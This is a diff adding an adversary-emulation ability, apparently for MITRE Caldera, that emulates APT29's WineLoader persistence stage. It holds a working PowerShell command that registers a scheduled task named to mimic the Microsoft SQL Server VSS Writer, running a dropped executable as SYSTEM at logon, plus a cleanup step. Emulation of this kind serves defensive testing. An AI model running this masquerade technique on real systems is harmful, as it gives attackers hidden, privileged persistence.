@@ -1,0 +1,51 @@
+- id: wineloader-stage3-persistence
+  name: WineLoader Stage 3 – Masquerade Task
+  description: Creation of a masqueraded scheduled task (Wait for Stage 2)
+  tactic: persistence
+  technique_id: T1053.005
+  technique_name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $ErrorActionPreference = "Stop";
+          $taskName = "MS SQL Writer";
+          $taskDesc = "Microsoft SQL Server VSS Writer";
+          $workDir = "C:\Users\Public\Music\Work";
+          $exePath = "$workDir\sqlwriter.exe";
+
+          # The file should exist at this point since Stage 2 has completed
+          if (Test-Path $exePath) {
+              try {
+                  $action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $workDir;
+                  $trigger = New-ScheduledTaskTrigger -AtLogOn;
+                  $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
+
+                  Register-ScheduledTask `
+                      -TaskName $taskName `
+                      -Action $action `
+                      -Trigger $trigger `
+                      -Principal $principal `
+                      -Description $taskDesc `
+                      -Force | Out-Null;
+                  
+                  Write-Output "task_created_ms_sql_writer";
+              } catch {
+                  Write-Error "Failed to register task: $($_.Exception.Message)";
+                  exit 1;
+              }
+          } else {
+              # If we reach this point, Stage 2 reported success
+              # but the executable is missing (unexpected race condition)
+              Write-Error "Race condition detected: File not found yet at $exePath";
+              exit 1;
+          }
+        parsers:
+          plugins.stockpile.app.parsers.line:
+            - source: apt29.wineloader.persistence
+        requirements:
+          - plugins.stockpile.app.requirements.paw_provenance:
+            - source: apt29.wineloader.status
+              match: stage2_executed
+        cleanup: |
+          Unregister-ScheduledTask -TaskName "MS SQL Writer" -Confirm:$false -ErrorAction SilentlyContinue
